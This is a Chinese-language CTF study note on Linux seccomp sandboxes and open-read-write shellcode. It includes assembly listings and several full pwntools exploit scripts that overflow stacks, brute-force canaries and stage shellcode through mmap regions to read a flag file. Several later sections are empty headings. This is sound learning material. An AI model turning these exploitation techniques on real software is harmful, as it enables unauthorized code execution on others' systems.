
#### 限制系统调用的方式

##### 1.调用prctl()函数：

prctl是一个系统调用，用于控制和修改进程的行为和属性。它可以在Linux系统上使用，提供了各种功能和选项来管理进程的不同方面。

以下是prctl函数的基本原型：

```
#include <sys/prctl.h>

int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
```

prctl函数接受不同的option选项和参数，用于执行不同的操作。下面是一些常用的option选项及其功能：

PR_SET_NAME：设置进程名称。

PR_GET_NAME：获取进程名称。

PR_SET_PDEATHSIG：设置在父进程终止时发送给当前进程的信号。

PR_GET_PDEATHSIG：获取父进程终止时发送给当前进程的信号。

PR_SET_DUMPABLE：设置进程的可转储标志，影响核心转储。

PR_GET_DUMPABLE：获取进程的可转储标志。

PR_SET_SECCOMP：设置进程的安全计算模式。

PR_GET_SECCOMP：获取进程的安全计算模式。

```

// 主要关注prctl()函数的第一个参数，也就是option,设定的option的值的不同导致黑名单不同，介绍2个比较重要的option
// PR_SET_NO_NEW_PRIVS(38) 和 PR_SET_SECCOMP(22)

// option为38的情况
// 此时第二个参数设置为1，则禁用execve系统调用且子进程一样受用
prctl(38, 1LL, 0LL, 0LL, 0LL);

// option为22的情况
// 此时第二个参数为1，只允许调用read/write/_exit(not exit_group)/sigreturn这几个syscall
// 第二个参数为2，则为过滤模式，其中对syscall的限制通过参数3的结构体来自定义过滤规则。
prctl(22, 2LL, &v1);
```

##### 2.seccomp函数原型：

```
#include <linux/seccomp.h>

int seccomp(unsigned int operation, unsigned int flags, void *args);
```

- operation：指定seccomp操作的类型，比如添加规则、修改规则等。
- flags：用于指定额外的标志，通常设置为0。
- args：一个指向操作所需参数的指针，具体内容根据不同的操作类型而定。

下面对一个调用示例的展示：

```
__int64 sandbox()
{
  __int64 v1; // [rsp+8h] [rbp-8h]

  // 这里介绍两个重要的宏，SCMP_ACT_ALLOW(0x7fff0000U) SCMP_ACT_KILL( 0x00000000U)
  // seccomp初始化，参数为0表示白名单模式，参数为0x7fff0000U则为黑名单模式
  v1 = seccomp_init(0LL);
  if ( !v1 )
  {
    puts("seccomp error");
    exit(0);
  }

  // seccomp_rule_add添加规则
  // v1对应上面初始化的返回值
  // 0x7fff0000即对应宏SCMP_ACT_ALLOW
  // 第三个参数代表对应的系统调用号，0-->read/1-->write/2-->open/60-->exit
  // 第四个参数表示是否需要对对应系统调用的参数做出限制以及指示做出限制的个数，传0不做任何限制
  seccomp_rule_add(v1, 0x7FFF0000LL, 2LL, 0LL);
  seccomp_rule_add(v1, 0x7FFF0000LL, 0LL, 0LL);
  seccomp_rule_add(v1, 0x7FFF0000LL, 1LL, 0LL);
  seccomp_rule_add(v1, 0x7FFF0000LL, 60LL, 0LL);
  seccomp_rule_add(v1, 0x7FFF0000LL, 231LL, 0LL);

  // seccomp_load->将当前seccomp过滤器加载到内核中
  if ( seccomp_load(v1) < 0 )
  {
    // seccomp_release->释放seccomp过滤器状态
    // 但对已经load的过滤规则不影响
    seccomp_release(v1);
    puts("seccomp error");
    exit(0);
  }
  return seccomp_release(v1);
}
```

可以看到上面调用的了orw和exit

### mmap函数：

mmap() 函数在Unix和类Unix系统（如Linux）中用于创建内存映射。其功能包括将一个文件或者设备映射到内存中，或者直接创建一个匿名的内存映射。

函数原型：

```
#include <sys/mman.h>

void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
```

其中参数的含义如下：

- addr：指定映射的起始地址，通常为0，表示由系统选择合适的地址。
- length：指定映射的长度，以字节为单位。
- prot：指定内存映射区域的保护方式，比如可读、可写、可执行等。
- flags：指定映射选项，比如是否共享、是否私有等。
- fd：指定要映射的文件描述符，若创建匿名映射则为-1。
- offset：指定文件映射的起始位置。
**![[Pasted image 20240923213808.png]]**

### 例题演示：

checksec 保护全关
![[Pasted image 20240923213828.png]]
可以看到有溢出
![[Pasted image 20240923213840.png]]
思路：

- 首先构造我们的shellcode
- 利用jmp_rsp，跳转到给我们提供mmap的内存这里写入我们的ROP链
- getshell
![[Pasted image 20240923213943.png]]
```
#coding=utf-8 
from pwn import *

context.log_level='debug'
context.arch='amd64'

p=remote("node5.buuoj.cn",26366)
#p=process('./pwn')
elf = ELF('./bad')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.recvuntil('Easy shellcode, have fun!')

mmap=0x123000
#orw=shellcraft.open('./flag.txt')
orw=shellcraft.open('./flag')
orw+=shellcraft.read(3,mmap,0x50)
orw+=shellcraft.write(1,mmap,0x50)

jmp_rsp=0x400A01

payload=asm(shellcraft.read(0,mmap,0x100))+asm('mov rax,0x123000;call rax')
payload=payload.ljust(0x28,b'\x00')
payload+=p64(jmp_rsp)+asm('sub rsp,0x30;jmp rsp')


p.sendline(payload)
shell=asm(orw)
p.sendline(shell)
p.interactive()
```


### 64位与32位的汇编

#### 32位

```
    ; "/home/orw/flag\x00" 保存到栈上
    ; 小端序
    ; 要注意给字符串结尾加上 '\x00'
    push   0x006761
    push   0x6c662f77
    push   0x726f2f65
    push   0x6d6f682f
    ; open("/home/orw/flag", O_RDONLY)
    ; #define O_RDONLY 0 
    mov eax,5       ; open() 系统调用号是 5
    mov ebx,esp ; "/home/orw/flag"
    xor ecx,ecx     ; O_RDONLY = 0
    xor edx,edx
    int 0x80        ; int 80h 会报错
    ; 返回 fd 保存到 eax 中

    ; read(fd, buf, count)
    mov ebx,eax     ; fd
    mov eax,3       ; read() 的系统调用号是 3
    mov ecx,esp     ; buf
    mov edx,0x30    ; count
    int 0x80

    ; write(fd, buf, count)
    mov eax,4       ; write() 的系统调用号是 4
    mov ebx,1       ; fd=1, write到标准输出
    mov ecx,esp     ; buf
    mov edx,0x30    ; count
    int 0x80
```

#### 64位

```
   ; open("flag", 0)
   0:   68 66 6c 61 67          push   0x67616c66
   5:   6a 02                   push   0x2
   7:   58                      pop    rax
   8:   48 89 e7                mov    rdi,rsp
   b:   48 31 f6                xor    rsi,rsi
   e:   0f 05                   syscall 

   ; read(fd, rsp, 0x20)
  10:   48 89 c7                mov    rdi,rax
  13:   48 31 c0                xor    rax,rax
  16:   48 89 e6                mov    rsi,rsp
  19:   6a 20                   push   0x20
  1b:   5a                      pop    rdx
  1c:   0f 05                   syscall 

   ; write(1, rsp, 0x20)
  1e:   6a 01                   push   0x1
  20:   58                      pop    rax
  21:   6a 01                   push   0x1
  23:   5f                      pop    rdi
  24:   48 89 e6                mov    rsi,rsp
  27:   6a 20                   push   0x20
  29:   5a                      pop    rdx
  2a:   0f 05                   syscall
```

#### 另一种64位

```
   ; open("flag", 0)
   0:   68 66 6c 61 67          push   0x67616c66
   5:   6a 02                   push   0x2
   7:   58                      pop    rax
   8:   48 89 e7                mov    rdi,rsp
   b:   48 31 f6                xor    rsi,rsi
   e:   0f 05                   syscall 

   ; read(fd, rsp, 0x20)
  10:   48 89 c7                mov    rdi,rax
  13:   48 31 c0                xor    rax,rax
  16:   48 89 e6                mov    rsi,rsp
  19:   6a 20                   push   0x20
  1b:   5a                      pop    rdx
  1c:   0f 05                   syscall 

   ; write(1, rsp, 0x20)
  1e:   6a 01                   push   0x1
  20:   58                      pop    rax
  21:   6a 01                   push   0x1
  23:   5f                      pop    rdi
  24:   48 89 e6                mov    rsi,rsp
  27:   6a 20                   push   0x20
  29:   5a                      pop    rdx
  2a:   0f 05                   syscall
```

### 1. orw都没有禁用

-------------------------------------------------------------------------------------------------------------------

我们看一道国赛分区赛的一道题

![[Pasted image 20240923214000.png]]

发现禁用了execve，orw没有禁用。

![[Pasted image 20240923214007.png]]

开了nx和金丝雀

可以看到主函数里面是有一个溢出函数的那么我门可以在第一处位置输入我们的

后门函数orw

![[Pasted image 20240923214014.png]]

bad函数里面我们可以通过fork子进程爆破

并且函数里面还有一个溢出函数，于是我们可以通过其检测爆破的canary

因为是循环，所以我们就可以再次输入read函数的ret的地址为mmap中open的地址

![[Pasted image 20240923214027.png]]

---

总体思路：一般是先放进去后门，然后再跳转到后门的地址去触发我门的后门函数然后引发一系列的反应

---

```
from pwn import*
context.arch='amd64'
context.os='linux'
# context.log_level='debug'
p = process('./guess')
# attach(p)

mmap=0x40404000

oopen=asm(shellcraft.open("./flag"))
readd=asm(shellcraft.read(3,mmap+0x400,0x100))
writee=asm(shellcraft.write(1,mmap+0x400,0x100))
p.sendline(oopen+readd+writee)

p.recvuntil('(0-1000):')

def canary(obj,offset,check):
    canary=b'\x00'
    for j in range(7):
        for i in range(256):
            obj.send(b'a'*offset+canary+bytes([i]))
            res=obj.recvuntil('(0-1000):')
            if check not in res:
                canary+=bytes([i])
                print ("canary: " , canary)
                break
    return canary

canary = canary(p,0x18,b'smashing')

payload=b'a'*0x18
payload+=canary
payload+=b'a'*0x8
payload+=p64(mmap)
p.sendline(payload)
p.interactive()
```

-------------------------------------------------------------------------------------------------------------------

下一题如下

![[Pasted image 20240923214043.png]]

没有禁用orw

![[Pasted image 20240923214050.png]]

只让读入0x10字节，这不够输入后门的，我们可以先输入一个read函数在mmap入口的位置，用这个read去输入我们需要的后门函数。
![[Pasted image 20240923214057.png]]

#### 重点：

在做这一题的时候read函数起初我是这样用的

这样是错的，因为题目限制了输入的字节数是0x10，

shellcaft.read()的字节数已经操超过了0x10字节。

![[Pasted image 20240923214110.png]]

这个时候我们就需要用到内联汇编了，我们自己用汇编去写一个read的函数调用

但是在这个汇编的编写过程中还是需要注意的点：

这个程序是64位的，但是我们用的时候用rdi，rsi，rdx，rax是不行的，会超过16个字节的限制，

这个时候我们就用32位的寄存器代替使用，这个是时候空间就够了。

然后需要填充nop滑板去滑到open的位置去执行。nop的字节应大于或等于read的字节长度。

mmap+的字节因该大于等于nop的字节长度。

记得edx给字节多一点，不然不够写后门orw的。

![[Pasted image 20240923214124.png]]

对于这篇文章的汇编有很多种写法，有一些我现在也不太理解。

[https://www.cnblogs.com/GGbomb/p/17826111.html](https://www.cnblogs.com/GGbomb/p/17826111.html)

[https://blog.csdn.net/Mr_Fmnwon/article/details/135377076](https://blog.csdn.net/Mr_Fmnwon/article/details/135377076)

```
from pwn import*
context.arch='amd64'
context.os='linux'
# context.log_level='debug'
p = process('./vuln')

mmap=0xCAFE0000


shellcode1=asm("""
               xor eax,eax
               xor edi,edi
               mov esi,0xcafe0000
               mov edx, 0x500
               syscall
               """)

print(len(shellcode1))
p.send(shellcode1)
p.recvuntil("Please input your shellcode:")
payload=b'\x90'*0x20
oopen=asm(shellcraft.open("./flag"))
readd=asm(shellcraft.read(3,mmap+0x20,0x100))
writee=asm(shellcraft.write(1,mmap+0x20,0x100))

p.sendline(payload+oopen+readd+writee)

p.interactive()
```

-------------------------------------------------------------------------------------------------------------------
下面这一题我觉得是很好的一道题对于寄存器的利用，我回顾了这题很多次

这题可以让你熟悉如何调用寄存器。19年的极客大挑战

![[Pasted image 20240910225113.png]]

![[Pasted image 20240923214138.png]]
可以看到read是往栈上写的，我们需要的后门是在mmap的空间上运行的

所以我们还需要一个read函数把后门orw写在mmap上

写好之后我们还需要跳转mmap上去运行

想运行这些条件的还有一个前提是 运行我们写在栈上的函数

那么这个时候就需要将rsp指针跳转感到这个位置去运行

下面是我画的一个大概的栈空间图示。

![[Pasted image 20240923214151.png]]

```
#coding=utf-8 
from pwn import *

# context.log_level='debug'
context.arch='amd64'

#p=remote("node5.buuoj.cn",25195)
p=process('./bad')
elf = ELF('./bad')
p.recvuntil('Easy shellcode, have fun!')

mmap=0x123000

orw=shellcraft.open('./flag')
orw+=shellcraft.read(3,mmap,0x50)
orw+=shellcraft.write(1,mmap,0x50)

jmp_rsp=0x400A01

payload=asm(shellcraft.read(0,mmap,0x100))+ asm('mov rax,0x123000;call rax')
payload=payload.ljust(0x28,b'\x90')
payload+=p64(jmp_rsp)+asm('sub rsp,0x30;jmp rsp')


p.sendline(payload)
shell=asm(orw)
p.sendline(shell)
p.interactive()
```

### 2. orw禁用o

有两种方法：

- 一种是retfq
- 一种是openat

#### 方法一：retfq

对于这种的题目，有种方法是retfq，也就是模式转换,我们是通过64位的系统下进行32位的空间申请，实现open函数的使用。

具体步骤如下：

1. 构造mmap和read的shellcode，开辟一块内存给32位的shellcode，并对这块区域进行写入
2. 转换32位程序，open一下flag，注意32位寄存器和64寄存器存储的区别
3. 转换64位程序，进行read和write

#### 方法二：openat




### 3. orw禁用r




### 4. orw禁用w

[https://www.jianshu.com/p/754b0a2ae353](https://www.jianshu.com/p/754b0a2ae353)



### 5. orw缺rw





### 6. orw缺ow

[https://blog.csdn.net/yongbaoii/article/details/118067019](https://blog.csdn.net/yongbaoii/article/details/118067019)




### 7. orw都禁用